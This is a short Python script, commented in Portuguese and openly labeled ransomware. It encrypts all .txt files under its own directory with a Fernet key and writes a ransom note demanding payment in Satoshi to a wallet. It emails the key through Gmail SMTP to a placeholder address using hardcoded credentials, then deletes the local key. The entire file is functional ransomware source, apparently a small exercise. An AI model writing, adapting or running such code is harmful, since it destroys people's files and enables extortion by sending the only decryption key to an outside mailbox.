
from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
import getpass
import os

#configuracao de email
EMAIL_ORIGEM = "teste@gmail.com"
EMAIL_DESTINO = "testex@gmail.com"
SENHA_EMAIL = "pass pass pass pass"

#envia email
def enviar_email():
    chave = carregar_chave()
    usuario = getpass.getuser()
    if chave:
        msg = MIMEText(chave.decode("utf-8"))
        msg['SUBJECT'] = "chaves de criptografia de " + usuario
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

#gerar chave

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

#carregar chave
def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo,chave):
    f = Fernet(chave)
    with open(arquivo,"rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#encontrar arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome.endswith(".txt"):
                lista.append(caminho)
    return lista

#criar mensagem resgate
def criar_mensagem_resgate():
    with open("LEIA ISSO.txt","w") as f:
        f.write("seus arquivos foram criprografados \n")
        f.write("Pague me em Satoshi ou fique sem seus arquivos \n")
        f.write("Carteira: 68a84af1-eb4f-47d2-95f3-0fc35d3246e1 \n")

#remove a chave apos enviar por email
def limpar_arquivos():
    if os.path.exists("chave.key"):
        os.remove("chave.key")

#execucao principal

def main():
    gerar_chave()
    chave = carregar_chave()
    diretorio = os.path.dirname(os.path.abspath(__file__))
    arquivos = encontrar_arquivos(diretorio)
    for arquivo in arquivos:
        criptografar_arquivo(arquivo,chave)
    criar_mensagem_resgate()
    enviar_email()
    limpar_arquivos()
    print("Ransomware executado! Arquivos criptogradados. Favor ler instruções no arquivo LEIA ISSO.txt")


if __name__ == "__main__":

    main()
